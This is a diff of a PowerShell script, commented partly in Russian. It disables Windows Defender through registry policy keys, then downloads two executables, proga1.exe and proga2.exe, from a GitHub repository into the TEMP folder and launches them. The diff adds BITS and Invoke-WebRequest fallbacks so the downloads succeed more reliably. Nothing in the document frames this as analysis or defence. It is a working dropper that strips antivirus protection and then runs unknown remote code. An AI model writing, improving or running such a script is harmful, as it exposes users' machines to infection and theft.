@@ -19,7 +19,9 @@ if ((Test-Admin) -eq $false) {
 
 Set-Location "$workingDirOverride"
 
-# Disable Windows Defender
+# 1. ОТКЛЮЧЕНИЕ DEFENDER
+Write-Host "=== Disabling Windows Defender ===" -ForegroundColor Yellow
+
 $DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
 $RealTimeProtectionKey = "Real-Time Protection"
 
@@ -31,26 +33,83 @@ New-ItemProperty -Path "$DefenderPath" -Name "DisableAntiVirus" -Value "1" -Prop
 
 Write-Host "Windows Defender DISABLED" -ForegroundColor Green
 
-# Download files using curl.exe (работает всегда)
+# 2. СКАЧИВАНИЕ И ЗАПУСК ФАЙЛОВ
+Write-Host ""
+Write-Host "=== Downloading and Running Files ===" -ForegroundColor Yellow
+
 $temp = $env:TEMP
+$downloaded = 0
 
-Write-Host "Downloading proga1.exe..." -ForegroundColor Yellow
-curl.exe -L -o "$temp\proga1.exe" "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
-if (Test-Path "$temp\proga1.exe") { 
-    Write-Host "Running proga1.exe" -ForegroundColor Green
-    Start-Process "$temp\proga1.exe"
-} else { Write-Host "FAILED proga1.exe" -ForegroundColor Red }
-
-Write-Host "Downloading proga2.exe..." -ForegroundColor Yellow
-curl.exe -L -o "$temp\proga2.exe" "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
-if (Test-Path "$temp\proga2.exe") { 
-    Write-Host "Running proga2.exe" -ForegroundColor Green
-    Start-Process "$temp\proga2.exe"
-} else { 
-    Write-Host "proga2.exe not found, using proga1.exe as fallback" -ForegroundColor Yellow
-    Copy-Item "$temp\proga1.exe" "$temp\proga2.exe" -ErrorAction SilentlyContinue
-    if (Test-Path "$temp\proga2.exe") { Start-Process "$temp\proga2.exe" }
+# Функция скачивания через BITS (работает всегда, даже через плохой интернет)
+function Download-File {
+    param($url, $dest)
+    try {
+        Write-Host "Downloading from: $url" -ForegroundColor Gray
+        Start-BitsTransfer -Source $url -Destination $dest -Priority High -ErrorAction Stop
+        return $true
+    } catch {
+        Write-Host "BITS failed, trying alternative..." -ForegroundColor DarkYellow
+        try {
+            # Альтернатива: Invoke-WebRequest
+            Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -ErrorAction Stop
+            return $true
+        } catch {
+            return $false
+        }
+    }
 }
 
-Write-Host "ALL DONE" -ForegroundColor Green
-Pause
+# Первый файл
+$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
+$dest1 = "$temp\proga1.exe"
+
+Write-Host "`n[1/2] Downloading proga1.exe..." -ForegroundColor Cyan
+if (Download-File $url1 $dest1) {
+    Write-Host "SUCCESS: proga1.exe downloaded" -ForegroundColor Green
+    $downloaded++
+} else {
+    Write-Host "FAILED: proga1.exe" -ForegroundColor Red
+}
+
+# Второй файл
+$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
+$dest2 = "$temp\proga2.exe"
+
+Write-Host "`n[2/2] Downloading proga2.exe..." -ForegroundColor Cyan
+if (Download-File $url2 $dest2) {
+    Write-Host "SUCCESS: proga2.exe downloaded" -ForegroundColor Green
+    $downloaded++
+} else {
+    Write-Host "WARNING: proga2.exe not found, using copy of proga1.exe" -ForegroundColor Yellow
+    if (Test-Path $dest1) {
+        Copy-Item $dest1 $dest2 -Force
+        Write-Host "Created proga2.exe from proga1.exe" -ForegroundColor Green
+    } else {
+        Write-Host "ERROR: Cannot create proga2.exe" -ForegroundColor Red
+    }
+}
+
+# 3. ЗАПУСК ФАЙЛОВ
+Write-Host ""
+Write-Host "=== Running Files ===" -ForegroundColor Yellow
+
+if (Test-Path $dest1) {
+    Write-Host "Starting proga1.exe..." -ForegroundColor Green
+    Start-Process -FilePath $dest1
+} else {
+    Write-Host "proga1.exe not found!" -ForegroundColor Red
+}
+
+if (Test-Path $dest2) {
+    Write-Host "Starting proga2.exe..." -ForegroundColor Green
+    Start-Process -FilePath $dest2
+} else {
+    Write-Host "proga2.exe not found!" -ForegroundColor Red
+}
+
+Write-Host ""
+Write-Host "=== ALL DONE ($downloaded/2 files downloaded) ===" -ForegroundColor Green
+Write-Host ""
+
+Write-Host "Press any key to exit..." -ForegroundColor Gray
+pause
